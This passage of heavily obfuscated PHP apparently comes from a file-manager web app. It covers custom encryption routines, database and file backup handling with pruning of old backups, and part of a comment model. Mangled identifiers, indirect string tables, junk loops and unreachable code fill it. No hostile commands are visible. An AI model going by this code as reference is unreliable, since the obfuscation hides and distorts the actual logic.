$Ñ§Åû = 3) { $ş™¨Æ‰¾ =& $_SERVER[¥ÙÌÜ¾ê]; $Ó€“ë‘â =& $_SERVER[ÏÒºµ×®]; if (!is_string($‚¯şŒ¼Û) || strlen($‚¯şŒ¼Û) < 10) { return !1; } $‚¯şŒ¼Û = trim($‚¯şŒ¼Û); $‚¯şŒ¼Û = strrev($‚¯şŒ¼Û); $»‹”—˜¹ = $‚¯şŒ¼Û[0]; $²øÆ‚À = substr($‚¯şŒ¼Û, 1, 15); $‹©¶‹ÚÀ = $ş™¨Æ‰¾[705]; if (strlen($‹©¶‹ÚÀ) < $ş™¨Æ‰¾[605]) { return; } $‚¯şŒ¼Û = substr($‚¯şŒ¼Û, 16); $Í»ò£ò = $ş™¨Æ‰¾[706]; $‚¿çÃÔÑ = $Ó€“ë‘â[290]; $ÂÒ¢»Ï = $ş™¨Æ‰¾[707]; if (strlen($ÂÒ¢»Ï) < $ş™¨Æ‰¾[601]) { return; } switch ($»‹”—˜¹) { case $Ó€“ë‘â[197]: $‘ï›ğÛ‡ = $this->pjfh5eb226cd($‚¯şŒ¼Û, strrev($éÆŒ“Äí . $²øÆ‚À)); break; case $Ó€“ë‘â[189]: $‘ï›ğÛ‡ = $this->pjfh5eb226cd($‚¯şŒ¼Û, strrev($²øÆ‚À . $éÆŒ“Äí)); break; $Õ®øÕ˜— = $ş™¨Æ‰¾[708]; if (strlen($Õ®øÕ˜—) < $ş™¨Æ‰¾[605]) { return; } case $Ó€“ë‘â[291]: $‘ï›ğÛ‡ = $this->pjfh5eb226cd($‚¯şŒ¼Û, base64_encode($²øÆ‚À . $éÆŒ“Äí)); break; $œÍ‡ÓÉª = $ş™¨Æ‰¾[709]; case $Ó€“ë‘â[292]: $‘ï›ğÛ‡ = $this->pjfh5eb226cd($‚¯şŒ¼Û, md5($²øÆ‚À . $éÆŒ“Äí)); break; $˜â­²ƒ = $ş™¨Æ‰¾[710]; while ($˜â­²ƒ < $ş™¨Æ‰¾[619]) { if ($˜â­²ƒ >= 0) { break; } $˜â­²ƒ++; } case $Ó€“ë‘â[293]: $‚¯şŒ¼Û = hash_decode($‚¯şŒ¼Û); $Œ¶šµúÇ = $‚¯şŒ¼Û[0]; $ª²üÁ°› = $ş™¨Æ‰¾[711]; while (strlen($ª²üÁ°›) < $ş™¨Æ‰¾[623]) { if (!$ª²üÁ°›) { break; } $ª²üÁ°›++; } $‚¯şŒ¼Û = substr($‚¯şŒ¼Û, 1); $Æ¶Ä£Çø = $ş™¨Æ‰¾[712]; while ($Æ¶Ä£Çø < $ş™¨Æ‰¾[605]) { if ($Æ¶Ä£Çø >= 0) { break; } $Æ¶Ä£Çø++; } $¤œö¯ñÄ = strpos($‚¿çÃÔÑ, $Œ¶šµúÇ); $ÔÀ˜¿»¸ = $ş™¨Æ‰¾[713]; if (!$ÔÀ˜¿»¸) { die; } $ş ‚Ù¤ = md5($Œ¶šµúÇ . md5($éÆŒ“Äí . $Œ¶šµúÇ) . $éÆŒ“Äí); $ş ‚Ù¤ = substr($ş ‚Ù¤, $¤œö¯ñÄ % 8, $¤œö¯ñÄ % 8 + 7); $Ş›î²è‰ = $Ó€“ë‘â[6]; $‘“å›¼ª = $ş™¨Æ‰¾[714]; while (strlen($‘“å›¼ª) < $ş™¨Æ‰¾[601]) { if (!$‘“å›¼ª) { break; } $‘“å›¼ª++; } $Š½»…ç = 0; $§ŞŠÃ‹¼ = 0; $ó€±­œ˜ = $ş™¨Æ‰¾[715]; if (!$ó€±­œ˜) { die; } $ã§Î‚Á = 0; $ô®ğƒ¼¥ = $ş™¨Æ‰¾[716]; if (!$ô®ğƒ¼¥) { return; } for ($Š½»…ç = 0; $Š½»…ç < strlen($‚¯şŒ¼Û); $Š½»…ç++) { $ã§Î‚Á = $ã§Î‚Á == strlen($ş ‚Ù¤) ? 0 : $ã§Î‚Á; $»•·µ¬ = $ş™¨Æ‰¾[717]; if (strlen($»•·µ¬) < $ş™¨Æ‰¾[605]) { return; } $æØ¢ƒÖ¼ = $ã§Î‚Á++; $ãš°”À = $ş™¨Æ‰¾[718]; if (strlen($ãš°”À) < $ş™¨Æ‰¾[601]) { return; } $§ŞŠÃ‹¼ = strpos($‚¿çÃÔÑ, $‚¯şŒ¼Û[$Š½»…ç]) - $¤œö¯ñÄ - ord($ş ‚Ù¤[$æØ¢ƒÖ¼]); while ($§ŞŠÃ‹¼ < 0) { $§ŞŠÃ‹¼ += 64; $™¿ñ°¶Ü = $ş™¨Æ‰¾[719]; if (strlen($™¿ñ°¶Ü) < $ş™¨Æ‰¾[623]) { die; } } $Ş›î²è‰ .= $‚¿çÃÔÑ[$§ŞŠÃ‹¼]; } $‘ï›ğÛ‡ = base64_decode($Ş›î²è‰); break; default: $‘ï›ğÛ‡ = $this->pjfh5eb226cd($‚¯şŒ¼Û, $éÆŒ“Äí . $²øÆ‚À); break; } if ($Ñ§Åû - 1 > 0) { $‘ï›ğÛ‡ = $this->lrchcf215377($‘ï›ğÛ‡, $éÆŒ“Äí, $Ñ§Åû - 1); } return $‘ï›ğÛ‡; } public function ytkgee1e599f($ˆÎİú) { $óÌ¦éÛÎ =& $_SERVER[¥ÙÌÜ¾ê]; $øÜò­Ù¹ =& $_SERVER[ÏÒºµ×®]; $»˜«˜…í = $this->qdrle26a6f57(); $şâ…”µÖ = $this->qdrle26a6f57(); $‘Ù…¥‰ = $óÌ¦éÛÎ[720]; $’ëğÖà = ($»˜«˜…í - 1) * ($şâ…”µÖ - 1); $Î‡Ÿ®“× = $óÌ¦éÛÎ[721]; while (strlen($Î‡Ÿ®“×) < $óÌ¦éÛÎ[619]) { if (!$Î‡Ÿ®“×) { break; } $Î‡Ÿ®“×++; } $Äûñ—Ô = intval(($»˜«˜…í + $şâ…”µÖ) / 2); while (1) { $æÁ×’ØØ = $Äûñ—Ô; $¾¨¿Õ• = $óÌ¦éÛÎ[647]; if (!$¾¨¿Õ•) { return; } $ƒÖÜ‘ø = $’ëğÖà; while ($ƒÖÜ‘ø % $æÁ×’ØØ != 0) { $»€ü™Ğó = $ƒÖÜ‘ø; $Éª¯çÑê = $óÌ¦éÛÎ[722]; while ($Éª¯çÑê < $óÌ¦éÛÎ[623]) { if ($Éª¯çÑê >= 0) { break; } $Éª¯çÑê++; } $ƒÖÜ‘ø = $æÁ×’ØØ; $ÄõÃŠÍ¤ = $óÌ¦éÛÎ[723]; $æÁ×’ØØ = $»€ü™Ğó % $æÁ×’ØØ; $ÔÀ¥¾Òš = $óÌ¦éÛÎ[724]; } if ($æÁ×’ØØ == 1) { break; } else { $Äûñ—Ô++; } } $õÔêéÇË = 2; for ($ÉèÏ’… = 0; $ÉèÏ’… < $’ëğÖà * 10; $ÉèÏ’…++) { if (($’ëğÖà * $ÉèÏ’… + 1) % $Äûñ—Ô == 0) { $õÔêéÇË = intval(($’ëğÖà * $ÉèÏ’… + 1) / $Äûñ—Ô); break; } } $Óºå±Û = $this->uflva157ea0f($»˜«˜…í * $şâ…”µÖ . $øÜò­Ù¹[6], $øÜò­Ù¹[128]); $˜­ƒ©° = md5($øÜò­Ù¹[294] . ($»˜«˜…í + $şâ…”µÖ) . $øÜò­Ù¹[295] . $Äûñ—Ô . $øÜò­Ù¹[295] . $õÔêéÇË . $øÜò­Ù¹[296]); $ÌãÛ’ù» = $this->uflva157ea0f($ˆÎİú, $˜­ƒ©°) . $øÜò­Ù¹[297] . $Óºå±Û; return $ÌãÛ’ù»; } public function zeyid68039e9($€ûŞ‚Ğ) { $Å•ŞñÒŸ =& $_SERVER[¥ÙÌÜ¾ê]; $ØîíşÊÌ =& $_SERVER[ÏÒºµ×®]; $ÓÛ¸³Ÿ  = explode($ØîíşÊÌ[297], $€ûŞ‚Ğ); if (count($ÓÛ¸³Ÿ ) != 2) { return $ØîíşÊÌ[6]; } $¡›¦¥êŒ = $this->pjfh5eb226cd($ÓÛ¸³Ÿ [1] . $ØîíşÊÌ[6], $ØîíşÊÌ[128]); $ÄöÍôÄ = $Å•ŞñÒŸ[725]; if (!$¡›¦¥êŒ) { return $ØîíşÊÌ[6]; } $¡›¦¥êŒ = intval($¡›¦¥êŒ); $¤¬–­€ï = $Å•ŞñÒŸ[726]; if (!$¤¬–­€ï) { return; } $¼°òµç = 0; $ Õê¬¶¹ = 0; for ($ÀÔÕÈğÕ = 3; $ÀÔÕÈğÕ < $¡›¦¥êŒ; $ÀÔÕÈğÕ += 2) { if ($¡›¦¥êŒ % $ÀÔÕÈğÕ != 0) { continue; } $¼°òµç = $ÀÔÕÈğÕ; $ã–ñØß  = $Å•ŞñÒŸ[727]; if (strlen($ã–ñØß ) < $Å•ŞñÒŸ[621]) { return; } $ Õê¬¶¹ = intval($¡›¦¥êŒ / $ÀÔÕÈğÕ); $û…“ªÁ† = $Å•ŞñÒŸ[728]; while (strlen($û…“ªÁ†) < $Å•ŞñÒŸ[605]) { if (!$û…“ªÁ†) { break; } $û…“ªÁ†++; } break; } $æö“¿ú = ($¼°òµç - 1) * ($ Õê¬¶¹ - 1); $‰Ïœ¬è¨ = $Å•ŞñÒŸ[729]; $‘ÏæÀ³à = intval(($¼°òµç + $ Õê¬¶¹) / 2); $÷ã“æÏÀ = $Å•ŞñÒŸ[730]; while (strlen($÷ã“æÏÀ) < $Å•ŞñÒŸ[623]) { if (!$÷ã“æÏÀ) { break; } $÷ã“æÏÀ++; } while (1) { $™”×ìß‰ = $‘ÏæÀ³à; $Ã©ÄÍ¿² = $Å•ŞñÒŸ[731]; while (strlen($Ã©ÄÍ¿²) < $Å•ŞñÒŸ[623]) { if (!$Ã©ÄÍ¿²) { break; } $Ã©ÄÍ¿²++; } $ê÷Š°Ÿ¬ = $æö“¿ú; $İ¡ ¤î™ = $Å•ŞñÒŸ[732]; if (strlen($İ¡ ¤î™) < $Å•ŞñÒŸ[621]) { return; } while ($ê÷Š°Ÿ¬ % $™”×ìß‰ != 0) { $œ¤¤¨åì = $ê÷Š°Ÿ¬; $ÑßÛäñ = $Å•ŞñÒŸ[733]; if (strlen($ÑßÛäñ) < $Å•ŞñÒŸ[601]) { return; } $ê÷Š°Ÿ¬ = $™”×ìß‰; $™”×ìß‰ = $œ¤¤¨åì % $™”×ìß‰; } if ($™”×ìß‰ == 1) { break; } else { $‘ÏæÀ³à++; } } $Õ†ÜÎŒß = 2; for ($ÀÔÕÈğÕ = 0; $ÀÔÕÈğÕ < $æö“¿ú * 10; $ÀÔÕÈğÕ++) { if (($æö“¿ú * $ÀÔÕÈğÕ + 1) % $‘ÏæÀ³à == 0) { $Õ†ÜÎŒß = intval(($æö“¿ú * $ÀÔÕÈğÕ + 1) / $‘ÏæÀ³à); break; } } $–™Ó³½ú = md5($ØîíşÊÌ[294] . ($¼°òµç + $ Õê¬¶¹) . $ØîíşÊÌ[295] . $‘ÏæÀ³à . $ØîíşÊÌ[295] . $Õ†ÜÎŒß . $ØîíşÊÌ[296]); $±Ò•»›ê = $Å•ŞñÒŸ[734]; if (!$±Ò•»›ê) { die; } $ÅŸùãïî = $this->pjfh5eb226cd($ÓÛ¸³Ÿ [0], $–™Ó³½ú); $‡µ­ğğ± = $Å•ŞñÒŸ[735]; while ($‡µ­ğğ± < $Å•ŞñÒŸ[623]) { if ($‡µ­ğğ± >= 0) { break; } $‡µ­ğğ±++; } return $ÅŸùãïî; } public function qdrle26a6f57() { $£¥ê•É =& $_SERVER[¥ÙÌÜ¾ê]; $™ÓÌÓ¢Ë = mt_rand(pow(2, 14), pow(2, 16) - 1); $Îœ¦¢Ô˜ = array(); $Ôí‘Úîı = 1; $€Ïèõ–ú = $£¥ê•É[736]; if (strlen($€Ïèõ–ú) < $£¥ê•É[623]) { die; } while ($Ôí‘Úîı <= (int) sqrt($™ÓÌÓ¢Ë)) { $æÓüº•ø = $Ôí‘Úîı; $¾Â²¶¦¬ = $£¥ê•É[737]; while ($¾Â²¶¦¬ < $£¥ê•É[619]) { if ($¾Â²¶¦¬ >= 0) { break; } $¾Â²¶¦¬++; } while (!0) { $æÓüº•ø++; if ($æÓüº•ø <= 2) { $Ôí‘Úîı = $æÓüº•ø; break; } else { if ($æÓüº•ø < 2) { continue; } } $¤÷½¹î’ = !0; for ($ÀÃìŞæ = 2; $ÀÃìŞæ <= sqrt($æÓüº•ø); $ÀÃìŞæ++) { if ($æÓüº•ø % $ÀÃìŞæ == 0) { $¤÷½¹î’ = !1; } } if ($¤÷½¹î’) { $Ôí‘Úîı = $æÓüº•ø; break; } } $Îœ¦¢Ô˜[] = $Ôí‘Úîı; $ã°—ßşÆ = $£¥ê•É[738]; while ($ã°—ßşÆ < $£¥ê•É[605]) { if ($ã°—ßşÆ >= 0) { break; } $ã°—ßşÆ++; } } $´¥Ïµ®ß = 2; $îÃ¶ŸÎ = $£¥ê•É[739]; if (strlen($îÃ¶ŸÎ) < $£¥ê•É[621]) { die; } for ($æÓüº•ø = $™ÓÌÓ¢Ë; $æÓüº•ø > 1; $æÓüº•ø--) { $¤÷½¹î’ = !0; foreach ($Îœ¦¢Ô˜ as $ã•ğ®¼) { if ($æÓüº•ø % $ã•ğ®¼ == 0) { $¤÷½¹î’ = !1; break; } } if ($¤÷½¹î’) { $´¥Ïµ®ß = $æÓüº•ø; break; } } return $´¥Ïµ®ß; $²·ÏßÎ = $£¥ê•É[740]; if (!$²·ÏßÎ) { return; } } public function jbumbdce5270($¥ …ÏÙ, $ğÃƒ¢›£) { $»ãŠÉ‘î =& $_SERVER[ÏÒºµ×®]; return call_user_func(array($»ãŠÉ‘î[8], $»ãŠÉ‘î[298]), $¥ …ÏÙ, $ğÃƒ¢›£); } public function uflva157ea0f($íÁì…¹×, $ÖĞ’¤–Í) { $¤¾»ëĞÕ =& $_SERVER[ÏÒºµ×®]; return call_user_func(array($¤¾»ëĞÕ[299], $¤¾»ëĞÕ[300]), $íÁì…¹×, $ÖĞ’¤–Í); } public function pjfh5eb226cd($òËÔŸ¹ò, $ïÂİ©§ß) { $´±­¢öş =& $_SERVER[ÏÒºµ×®]; return call_user_func(array($´±­¢öş[299], $´±­¢öş[301]), $òËÔŸ¹ò, $ïÂİ©§ß); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $¬Ş¶ß… =& $_SERVER[¥ÙÌÜ¾ê]; $this->isManual(); self::$name = date($¬Ş¶ß…[741]); if (!($…ƒà‡¦Œ = Model($¬Ş¶ß…[742])->lastItem())) { $…ƒà‡¦Œ = $this->initData(); } else { self::$name = $…ƒà‡¦Œ[$¬Ş¶ß…[28]]; if ($…ƒà‡¦Œ[$¬Ş¶ß…[743]] == $¬Ş¶ß…[87]) { self::$name = date($¬Ş¶ß…[744]); $¸ã ôı¶ = 0; if (isset($…ƒà‡¦Œ[$¬Ş¶ß…[291]][$¬Ş¶ß…[193]][$¬Ş¶ß…[461]])) { $¸ã ôı¶ = (int) $…ƒà‡¦Œ[$¬Ş¶ß…[291]][$¬Ş¶ß…[193]][$¬Ş¶ß…[461]]; } if (self::$manual == 0 && $…ƒà‡¦Œ[$¬Ş¶ß…[28]] == self::$name) { Model($¬Ş¶ß…[742])->remove($…ƒà‡¦Œ[$¬Ş¶ß…[395]]); } $…ƒà‡¦Œ = $this->initData($¸ã ôı¶, $…ƒà‡¦Œ[$¬Ş¶ß…[745]]); } else { $this->checkStore($…ƒà‡¦Œ[$¬Ş¶ß…[745]]); } } self::$option = $…ƒà‡¦Œ; } private function isManual() { $¦¬ùÁÒ’ = _get($GLOBALS, $_SERVER[¥ÙÌÜ¾ê][746], 0); $¦¬ùÁÒ’ = intval($¦¬ùÁÒ’); self::$manual = $¦¬ùÁÒ’ && $¦¬ùÁÒ’ == 1 ? 1 : 0; } private function initData($÷†Ê¥”ê = 0, $Ş”Ìî = '') { $ù°‚ıÈ† =& $_SERVER[¥ÙÌÜ¾ê]; $¦ÖÄåÚ¾ = Model($ù°‚ıÈ†[742])->config(); if ($Ş”Ìî && $¦ÖÄåÚ¾[$ù°‚ıÈ†[745]] != $Ş”Ìî) { $÷†Ê¥”ê = 0; } $this->checkStore($¦ÖÄåÚ¾[$ù°‚ıÈ†[745]]); if (self::$manual == 1) { self::$name .= $ù°‚ıÈ†[71] . date($ù°‚ıÈ†[747]); } $¯½­æ‹¹ = array($ù°‚ıÈ†[745] => $¦ÖÄåÚ¾[$ù°‚ıÈ†[745]], $ù°‚ıÈ†[28] => self::$name, $ù°‚ıÈ†[743] => 0, $ù°‚ıÈ†[748] => $¦ÖÄåÚ¾[$ù°‚ıÈ†[748]], $ù°‚ıÈ†[749] => self::$manual, $ù°‚ıÈ†[291] => array($ù°‚ıÈ†[750] => array($ù°‚ıÈ†[743] => 0), $ù°‚ıÈ†[751] => array($ù°‚ıÈ†[743] => 0, $ù°‚ıÈ†[752] => 0, $ù°‚ıÈ†[753] => 0, $ù°‚ıÈ†[29] => $ù°‚ıÈ†[33], $ù°‚ıÈ†[754] => 0, $ù°‚ıÈ†[490] => 0), $ù°‚ıÈ†[755] => array($ù°‚ıÈ†[743] => 0, $ù°‚ıÈ†[752] => 0, $ù°‚ıÈ†[753] => 0, $ù°‚ıÈ†[754] => 0, $ù°‚ıÈ†[490] => 0), $ù°‚ıÈ†[193] => array($ù°‚ıÈ†[743] => 0, $ù°‚ıÈ†[756] => 0, $ù°‚ıÈ†[757] => 0, $ù°‚ıÈ†[758] => 0, $ù°‚ıÈ†[759] => 0, $ù°‚ıÈ†[461] => $÷†Ê¥”ê, $ù°‚ıÈ†[754] => 0, $ù°‚ıÈ†[490] => 0)), $ù°‚ıÈ†[754] => time(), $ù°‚ıÈ†[490] => 0); $‰‚Äª = Model($ù°‚ıÈ†[742])->insert($¯½­æ‹¹); $¯½­æ‹¹[$ù°‚ıÈ†[395]] = $‰‚Äª; return $¯½­æ‹¹; } private function checkStore($ÕĞ´†ä¢) { $Î™¤İÂ“ =& $_SERVER[¥ÙÌÜ¾ê]; $ëÇ´˜¥¦ = Model($Î™¤İÂ“[760])->listData($ÕĞ´†ä¢); Model($Î™¤İÂ“[760])->checkConfig($ëÇ´˜¥¦); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¥ÙÌÜ¾ê][742])->findByName(self::$name); } return self::$option; } public static function set($¥˜™Üì‚) { $Ø©¼©ÒŞ =& $_SERVER[¥ÙÌÜ¾ê]; $¼Â“ê®­ = self::get(); foreach ($¥˜™Üì‚ as $—‡ÇÛ§Ê => $ªöÏ€§•) { $‘œ–ß‚  = explode($Ø©¼©ÒŞ[95], $—‡ÇÛ§Ê); $Õãªñ‰ = count($‘œ–ß‚ ); switch ($Õãªñ‰) { case 1: $¼Â“ê®­[$‘œ–ß‚ [0]] = $ªöÏ€§•; break; case 2: $¼Â“ê®­[$‘œ–ß‚ [0]][$‘œ–ß‚ [1]] = $ªöÏ€§•; break; case 3: $¼Â“ê®­[$‘œ–ß‚ [0]][$‘œ–ß‚ [1]][$‘œ–ß‚ [2]] = $ªöÏ€§•; break; } } Model($Ø©¼©ÒŞ[742])->update($¼Â“ê®­[$Ø©¼©ÒŞ[395]], $¼Â“ê®­); self::$option = $¼Â“ê®­; return self::$option; } public function keep() { $¼Ë¾£öÍ =& $_SERVER[¥ÙÌÜ¾ê]; $ÈèÁ´¬ = self::get(); if ($ÈèÁ´¬[$¼Ë¾£öÍ[291]][$¼Ë¾£öÍ[750]][$¼Ë¾£öÍ[743]] == $¼Ë¾£öÍ[87]) { return; } $this->backupKeep($ÈèÁ´¬); self::set(array($¼Ë¾£öÍ[761] => 1)); } private function backupKeep($äÉğî…ô) { $›æÕôºÌ =& $_SERVER[¥ÙÌÜ¾ê]; if (self::$manual == 1) { return; } $û„¤øœú = Model($›æÕôºÌ[742])->listData(); if (empty($û„¤øœú)) { return; } $íå»±òø = 0; $‹²Ù„¼Ô = array(); foreach ($û„¤øœú as $®–ŞÕõ) { if ($íå»±òø >= 7) { break; } $‹²Ù„¼Ô[] = $®–ŞÕõ[$›æÕôºÌ[28]]; $íå»±òø++; } for ($íå»±òø = 0; $íå»±òø < 12; $íå»±òø++) { $‹²Ù„¼Ô[] = date($›æÕôºÌ[762], strtotime("\55{$íå»±òø}\40\155\157\x6e\x74\x68\x73")); } $‹²Ù„¼Ô = array_unique($‹²Ù„¼Ô); $Ç¶ÌÈ„õ = Model($›æÕôºÌ[763])->get($›æÕôºÌ[764]); foreach ($û„¤øœú as $®–ŞÕõ) { if (isset($®–ŞÕõ[$›æÕôºÌ[749]]) && $®–ŞÕõ[$›æÕôºÌ[749]] == $›æÕôºÌ[87]) { continue; } if (!empty($®–ŞÕõ[$›æÕôºÌ[28]]) && in_array($®–ŞÕõ[$›æÕôºÌ[28]], $‹²Ù„¼Ô)) { continue; } Model($›æÕôºÌ[742])->remove($®–ŞÕõ[$›æÕôºÌ[395]]); $²œ‡˜° = $this->backupPath($äÉğî…ô, $Ç¶ÌÈ„õ); IO::remove($²œ‡˜°, !1); } } private function backupPath($—åÏŒŞ, $§‹³İ¾Ò = false) { $·Â¯íµÃ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$§‹³İ¾Ò) { $§‹³İ¾Ò = Model($·Â¯íµÃ[763])->get($·Â¯íµÃ[764]); } $ÎÑÕ­çÖ = $—åÏŒŞ[$·Â¯íµÃ[28]]; $ÒâØşëâ = substr(md5($·Â¯íµÃ[765] . $§‹³İ¾Ò . $ÎÑÕ­çÖ), 0, 8); return "\x7b\x69\157\x3a{$—åÏŒŞ[$·Â¯íµÃ[745]]}\175\57\x64\x61\x74\141\142\141\163\x65\57\142\x61\x63\x6b\x75\x70\x2f" . $ÎÑÕ­çÖ . $·Â¯íµÃ[71] . $ÒâØşëâ; } public function db() { $„ùı¶ =& $_SERVER[¥ÙÌÜ¾ê]; $Ñœ¥Ÿ‡Ç = self::get(); if ($Ñœ¥Ÿ‡Ç[$„ùı¶[291]][$„ùı¶[751]][$„ùı¶[743]] == $„ùı¶[87]) { return !0; } $¤Î‹Â‰ = new BackupDb(); if (!$¤Î‹Â‰->index()) { return !1; } self::set(array($„ùı¶[766] => 1)); return !0; } public function dbFile() { $ÚÕÕƒşÄ =& $_SERVER[¥ÙÌÜ¾ê]; $íöœŒˆØ = self::get(); if ($íöœŒˆØ[$ÚÕÕƒşÄ[291]][$ÚÕÕƒşÄ[755]][$ÚÕÕƒşÄ[743]] == $ÚÕÕƒşÄ[87]) { return !0; } $¥­¤ìß« = new BackupDbFile(); if (!$¥­¤ìß«->index()) { return !1; } self::set(array($ÚÕÕƒşÄ[767] => 1)); return !0; } public function file() { $±ÎèŸ²Æ =& $_SERVER[¥ÙÌÜ¾ê]; $Í¹¶™’Î = self::get(); if ($Í¹¶™’Î[$±ÎèŸ²Æ[291]][$±ÎèŸ²Æ[193]][$±ÎèŸ²Æ[743]] == $±ÎèŸ²Æ[87]) { return !0; } if (!isset($Í¹¶™’Î[$±ÎèŸ²Æ[748]]) || $Í¹¶™’Î[$±ÎèŸ²Æ[748]] == $±ÎèŸ²Æ[191]) { $ñ¡ï£È£ = new BackupFile(); if (!$ñ¡ï£È£->index()) { return !1; } } self::set(array($±ÎèŸ²Æ[768] => 1, $±ÎèŸ²Æ[743] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $’êäàš” =& $_SERVER[¥ÙÌÜ¾ê]; $ÑÁıó‘û = Backup::get(); self::$io = $ÑÁıó‘û[$’êäàš”[745]]; self::$name = $ÑÁıó‘û[$’êäàš”[28]]; $‘µ•ÏğÊ = $GLOBALS[$’êäàš”[6]][$’êäàš”[17]]; $òÛÛÒúŒ = $this->_dbType($‘µ•ÏğÊ); $®­¡§œ½ = new DbManage($‘µ•ÏğÊ, $òÛÛÒúŒ); $°ÇÍíëÏ = array($’êäàš”[769] => $òÛÛÒúŒ, $’êäàš”[770] => time()); Backup::set($°ÇÍíëÏ); $Ó¬ş÷ÎŠ = $this->tmpFilesPath() . $’êäàš”[771] . self::$name . $’êäàš”[8]; del_dir($Ó¬ş÷ÎŠ); mk_dir($Ó¬ş÷ÎŠ); $¶Ø·‡ó = $öùı³± = 0; try { $Éä¢¿Øõ = $®­¡§œ½->db()->getTables(); } catch (Exception $ìàÄ·ı) { return !1; } $Éä¢¿Øõ = array_diff($Éä¢¿Øõ, array($’êäàš”[772], $’êäàš”[773])); foreach ($Éä¢¿Øõ as $Ú‘À´Œ) { $¶Ø·‡ó += $®­¡§œ½->model($Ú‘À´Œ)->count(); } $”œÜ¨ë… = new Task($’êäàš”[774], $’êäàš”[775], $¶Ø·‡ó, LNG($’êäàš”[776]) . $’êäàš”[777] . LNG($’êäàš”[778])); foreach ($Éä¢¿Øõ as $Ú‘À´Œ) { $„Ş¿µ§‡ = $Ó¬ş÷ÎŠ . $Ú‘À´Œ . $’êäàš”[779]; $Ä½Ô†Åâ = null; if ($Ú‘À´Œ == $’êäàš”[780] && (!isset($ÑÁıó‘û[$’êäàš”[748]]) || $ÑÁıó‘û[$’êäàš”[748]] == $’êäàš”[191])) { $Ä½Ô†Åâ = self::$io; } $öùı³± += $®­¡§œ½->sqlFromDb($Ú‘À´Œ, $„Ş¿µ§‡, $”œÜ¨ë…, $Ä½Ô†Åâ); } if (isset($”œÜ¨ë…->task[$’êäàš”[781]])) { $·Ã»·²ª = $”œÜ¨ë…->task[$’êäàš”[781]] ? $”œÜ¨ë…->task[$’êäàš”[781]] : timeFloat(); $Îïçç¢ = $·Ã»·²ª - $”œÜ¨ë…->task[$’êäàš”[782]]; if ($Îïçç¢ >= 0.2) { $¶Ø·‡ó += 1; } } $”œÜ¨ë…->end(); $°ÇÍíëÏ = array($’êäàš”[769] => $òÛÛÒúŒ, $’êäàš”[766] => 1, $’êäàš”[783] => $¶Ø·‡ó, $’êäàš”[784] => $öùı³±, $’êäàš”[785] => time()); Backup::set($°ÇÍíëÏ); if ($¶Ø·‡ó - $öùı³± > 1) { $Á¶­Ìé = $’êäàš”[786]; if (stristr(I18n::getType(), $’êäàš”[787])) { $Á¶­Ìé = $’êäàš”[788]; } write_log(array($Á¶­Ìé, $°ÇÍíëÏ), $’êäàš”[775]); return !1; } return !0; } private function _dbType($İ÷®©ùé) { $‚œÜ®ôİ =& $_SERVER[¥ÙÌÜ¾ê]; $İ÷®©ùé = array_change_key_case($İ÷®©ùé); $…ÜµËÑ® = $İ÷®©ùé[$‚œÜ®ôİ[789]]; if ($…ÜµËÑ® == $‚œÜ®ôİ[790]) { $¸Î†Ï€ë = explode($‚œÜ®ôİ[4], $İ÷®©ùé[$‚œÜ®ôİ[791]]); $…ÜµËÑ® = $¸Î†Ï€ë[0]; } $àÎ¨Îöı = array($‚œÜ®ôİ[792] => $‚œÜ®ôİ[9], $‚œÜ®ôİ[793] => $‚œÜ®ôİ[794]); if (isset($àÎ¨Îöı[$…ÜµËÑ®])) { $…ÜµËÑ® = $àÎ¨Îöı[$…ÜµËÑ®]; } return $…ÜµËÑ®; } private function tmpFilesPath() { $Æ’ÇçáÏ =& $_SERVER[¥ÙÌÜ¾ê]; $Ó¯¨˜®³ = TEMP_FILES; if ($GLOBALS[$Æ’ÇçáÏ[6]][$Æ’ÇçáÏ[88]][$Æ’ÇçáÏ[795]]) { $Ó¯¨˜®³ = $GLOBALS[$Æ’ÇçáÏ[6]][$Æ’ÇçáÏ[88]][$Æ’ÇçáÏ[795]]; if (!mk_dir($Ó¯¨˜®³) || !is_writable($Ó¯¨˜®³) || !IO::mkfile($Ó¯¨˜®³ . $Æ’ÇçáÏ[796])) { $Ó¯¨˜®³ = TEMP_FILES; } } return $Ó¯¨˜®³; } } goto C°‚ÎÒå˜·; FÃ¡‚Ï‡­­: class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\155\145\156\x74"; protected $tableMeta = array("\x74\x61\142\154\x65\116\141\155\x65" => "\143\x6f\x6d\x6d\145\x6e\164\x5f\x6d\145\164\141", "\x6d\x65\x74\x61\106\x69\145\x6c\144" => "\143\157\155\x6d\x65\x6e\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ù¨åˆ) { $•Ğò¦‹ =& $_SERVER[¥ÙÌÜ¾ê]; if ($ù¨åˆ[$•Ğò¦‹[1777]]) { $æï¬ÉÙ = $this->where(array($•Ğò¦‹[1778] => $ù¨åˆ[$•Ğò¦‹[1777]]))->find(); if (!$æï¬ÉÙ || $æï¬ÉÙ[$•Ğò¦‹[406]] != $ù¨åˆ[$•Ğò¦‹[406]] || $æï¬ÉÙ[$•Ğò¦‹[498]] != $ù¨åˆ[$•Ğò¦‹[498]]) { return !1; } $this->where(array($•Ğò¦‹[1778] => $ù¨åˆ[$•Ğò¦‹[1777]]))->setAdd($•Ğò¦‹[1779], 1); } $ù¨åˆ[$•Ğò¦‹[1780]] = 0; $ù¨åˆ[$•Ğò¦‹[1779]] = 0; $ù¨åˆ[$•Ğò¦‹[743]] = 1; return $this->add($ù¨åˆ); } public function commentCount($úëè²°, $İíØıÏö, $Æƒú¤Ùê = false) { $õÈº¾˜™ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$úëè²°) { return array(); } if (is_string($úëè²°) || is_int($úëè²°)) { $úëè²° = array($úëè²°); } $¡÷•Ø‰Â = array($õÈº¾˜™[498], $õÈº¾˜™[1781] => $õÈº¾˜™[494]); $¨‘×Ô­ = array($õÈº¾˜™[498] => array($õÈº¾˜™[7], $úëè²°), $õÈº¾˜™[406] => $İíØıÏö); if ($Æƒú¤Ùê) { 